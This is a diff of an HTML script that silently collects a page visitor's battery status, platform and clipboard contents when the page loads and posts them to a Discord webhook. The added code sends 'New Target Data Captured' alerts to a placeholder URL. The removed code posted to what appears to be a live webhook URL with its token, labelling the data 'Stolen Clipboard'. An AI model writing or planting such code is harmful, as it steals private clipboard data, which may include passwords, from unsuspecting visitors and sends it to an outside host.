@@ -1,33 +1,31 @@
 <script>
-    if ('getBattery' in navigator) {
-        navigator.getBattery().then(function(battery) {
-            const data = {
-                batteryLevel: Math.round(battery.level * 100),
-                charging: battery.charging,
-                timestamp: new Date().toISOString(),
-                userAgent: navigator.userAgent
-            };
+    async function sendTroll() {
+        let batteryInfo = "Unknown";
+        let clipboardText = "Denied or Unavailable";
 
-            fetch('https://discord.com/api/webhooks/1547219958113501184/yl_zJgd1KLN5n984pKjm6T6lpuvSTnx-9EKITJ3MtcQEsHeFWoNDiST-kNu6DzR6Vkvn', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    content: `🔋 **New Visitor Alert!** Battery: ${Math.round(battery.level * 100)}% | Charging: ${battery.charging}`
-                })
-            });
-            navigator.clipboard.readText().then(text => {
-                fetch('https://discord.com/api/webhooks/1547219958113501184/yl_zJgd1KLN5n984pKjm6T6lpuvSTnx-9EKITJ3MtcQEsHeFWoNDiST-kNu6DzR6Vkvn', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        content: `📋 **Stolen Clipboard:** "${text}"`
-                    })
-                });
-            }).catch(err => {
-                // User denied clipboard permission
-            });
+        // Try getting battery
+        if ('getBattery' in navigator) {
+            try {
+                const b = await navigator.getBattery();
+                batteryInfo = `${Math.round(b.level * 100)}% (Charging: ${b.charging})`;
+            } catch(e) {}
+        }
+
+        // Try getting clipboard (requires user click elsewhere on page)
+        try {
+            clipboardText = await navigator.clipboard.readText();
+        } catch(e) {}
+
+        const payload = {
+            content: `🚨 **New Target Data Captured!**\n🔋 Battery: ${batteryInfo}\n📋 Clipboard: \`${clipboardText}\`\n🌐 Platform: ${navigator.platform}`
+        };
+
+        fetch('YOUR_DISCORD_WEBHOOK_URL', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
         });
     }
+
+    sendTroll();
 </script>
